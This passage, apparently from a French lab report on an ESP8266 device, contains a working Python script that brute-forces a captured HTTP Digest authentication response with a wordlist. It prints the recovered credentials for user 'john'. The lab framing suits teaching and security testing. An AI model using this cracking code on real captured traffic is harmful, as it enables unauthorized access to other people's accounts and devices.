![Trame HTTP[]{label="fig:net "}](image/9.jpg){#fig:net }

On Brute force avec mon programme python en modifiant les variables par
celle trouvé dans la capture:

-   ``` {#manip/puce/digest_authAP2.py .python caption="Le code est 65983241" label="manip/puce/digest_authAP2.py" style="Style1"}
    import hashlib
    #GET /login HTTP/1.1
    #Authorization: Digest 
    username="john"
    realm="ESP8266 IDO Auth Realm"
    nonce="697e2220a3e76ed724cedc2c08769807"
    uri="/login"
    cnonce="YTRlYzhkZjg4MWViMTNhMTMyYmViZmY1MWFhMmNlZjY="
    nc="00000001"
    qop="auth"
    response="c32fc78154711b36ef2239c815ad6c7a"
    opaque="381c3490d37cf068825bbab96fe716d1"






    with open('dico.txt', 'r') as mon_dico:
        for line in mon_dico:
            mdp = str(line)[:-1]
            hash1 = username+":"+realm+":"+mdp
            hash11 = hashlib.md5(hash1.encode())
            hash111 = hash11.hexdigest()
            #--------#
            hash2 = "GET:"+uri
            hash22 = hashlib.md5(hash2.encode())
            hash222 = hash22.hexdigest()
            #--------#
            hash3 = hash111+":"+nonce+":"+nc+":"+cnonce+":"+qop+":"+hash222
            hash33 = hashlib.md5(hash3.encode())
            hash333= hash33.hexdigest()
            #print(" result :"+hash333)
            #--------#
            if hash333==response:
                print("Right Login/Password : "+mdp)
                break
     #       else:
    #            print("||||"+mdp+"|||||")

    #---------STDOUT---------#
    #[slaynpool@MiniZbeub]puce$ python digest_authAP2.py 
    #Right Login/Password : 65983241
    #---------STDOUT---------#



    ```

Donc, nous savons à present que le mot de passe nessacaire pour ce
connecter à l'AP est : 61495327\
Le nom d'utilisateur est : john (On le sais grace à la trame HTTP)\
Et que le mot de passe de john est : 65983241\
